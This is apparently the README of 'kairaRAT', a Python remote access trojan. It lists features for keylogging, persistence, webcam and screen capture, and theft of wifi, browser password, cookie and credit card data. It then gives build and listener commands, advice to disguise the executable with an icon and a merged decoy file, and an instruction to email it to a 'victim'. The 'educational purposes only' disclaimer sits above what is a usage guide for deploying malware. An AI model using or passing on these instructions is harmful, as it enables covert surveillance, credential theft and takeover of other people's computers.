# kairaRAT
kairaRAT is a remote access trojan tool built with python. 

This is based on the project of the same name by: st4inl3s5 (stainless)

Needs python 3.8 or higher

# EDUCATIONAL PURPOSES ONLY. 
#### > There is absolutely no warranty express or implied. 
#### > Do NOT USE on computers that you do not control.
#### > It is made exclusively for training in a highly Controlled lab environment. 
#### > Do NOT use outside a controlled lab. This is your last WARNING. 
#### > You are completely responsible for how you use kairaRAT. Any use of kairaRAT is at your own risk. 
#### > Wrong / Improper use of kairaRAT may be an offence.
#### > Use of kairaRAT for BAD / Illegal activities is a punishable offence. 
 
## Features

+ File/directory managing (delete, rename, create, change etc.)

+ Download files from victim's computer.

+ Executing command on windows command prompt.

+ Taking screenshots from victim's computer.

+ Taking victim's camera snapshots.

+ Keylogger.

+ Persistence(hides trojan to registry and copies itself.)

+ Taking wifi names and passwords.

+ Connection without disconnection.

+ Can be merged with an arbitrary file.

+ Automatic build mode.

+ Taking browser saved cookies, passwords and credit cards.


## SETUP

You need 2 OS.1)Unix(You can use kali linux) OS 2)Windows OS.Unix for listening connections and managing connections.Windows for building .exe executable file.To make setup, execute the following command on both of them :

 On Windows:
     
     pip install -r winrequirements.txt

 On Linux:

     pip install -r linrequirements.txt

## USAGE

  1. If you want to put icon for the trojan, go to internet and find a image file.Then convert this image file to icon file(with .ico extension) and save this icon to your windows.And if you want to merge a file with trojan too, go to internet and find a merge file(this can be .docx, .png, .jpg etc.) and save to your windows.(This step is optional for social engineering.)
 
  2. In windows, open a command prompt terminal and change the directory to the kairaRAT project directory.Build the executable file with following command :
 
    python main.py build -ip <your_server_ip_address> -p <your_server_port> -i <icon_file(optional)> -m <file_to_merge(optional)> -n <file_name_after_build_finish(optional)>
 
  + Example

        python main.py build -ip 172.28.89.113 -p 4444 -i filetoicon.ico -m hashtypes.png -n kaira.exe
 
  + Example
  
        python main.py build -ip 172.28.89.113 -p 4444 -n kaira.exe
 
![zibab2](https://github.com/st4inl3s5/kairaRAT/assets/68844502/e1a1f0c5-90e7-4db2-8bbc-02c3ada16920)

  3. Wait for building process.When the building finished, you see a message :
 
![zibib3](https://github.com/st4inl3s5/kairaRAT/assets/68844502/1dcc35df-0e02-46ee-82e7-45b03f51a5b5)

  4. Check the builds directory.You must see the executable file.

![zibib4](https://github.com/st4inl3s5/kairaRAT/assets/68844502/8e00b10f-f171-4790-a819-0c9f5f33e70b)

  5. After that, send this executable file to your victim via email etc.And wait for victim's execute the file.When executed, the merge file will be opened(if you configured to) and trojan executing in background.Copies itself, keylogging and makes persistence.
 
![zibib5](https://github.com/st4inl3s5/kairaRAT/assets/68844502/f90e71f9-c883-4600-ae8d-bdb3f8ae0ab6)

  6. Then listen the connections on your linux with the following command :
 
    python3 main.py server -ip <your_server_ip_address> -p <your_server_port>
 
  +  Example

    python3 main.py server -ip 172.28.89.113 -p 4444 
 
  7. When the connection established, a screen like this appear :

![zibib1](https://github.com/st4inl3s5/kairaRAT/assets/68844502/3b84fe44-21e2-43de-ab7a-c3c50d5fb35c)

  8. Type 'help' for command list.The usage all of them is written.
 
  9. You can take camera snapshots, screenshots, victim's keylogs.
 
![zibib6](https://github.com/st4inl3s5/kairaRAT/assets/68844502/f6695aa3-cb72-4b80-83d1-9ff27ec8c681)


